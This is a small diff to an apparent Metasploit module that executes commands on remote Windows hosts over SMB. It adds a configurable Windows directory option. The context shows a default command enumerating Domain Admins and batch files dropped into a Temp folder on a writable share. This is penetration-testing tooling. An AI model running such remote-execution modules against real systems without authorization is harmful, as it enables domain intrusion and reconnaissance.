@@ -45,6 +45,7 @@ class Metasploit3 < Msf::Auxiliary
 			OptString.new('SMBSHARE', [true, 'The name of a writeable share on the server', 'C$']),
 			OptString.new('COMMAND', [true, 'The command you want to execute on the remote host', 'net group "Domain Admins" /domain']),
 			OptString.new('RPORT', [true, 'The Target port', 445]),
+			OptString.new('WINPATH', [true, 'The name of the remote Windows directory', 'WINDOWS']),
 		], self.class)
 
 		deregister_options('RHOST')
@@ -56,7 +57,7 @@ class Metasploit3 < Msf::Auxiliary
 
 	# This is the main controle method
 	def run_host(ip)
-		text = "\\WINDOWS\\Temp\\#{Rex::Text.rand_text_alpha(16)}.txt"
+		text = "\\#{datastore['WINPATH']}\\Temp\\#{Rex::Text.rand_text_alpha(16)}.txt"
 		bat = "%WINDIR%\\Temp\\#{Rex::Text.rand_text_alpha(16)}.bat"
 		smbshare = datastore['SMBSHARE']
 
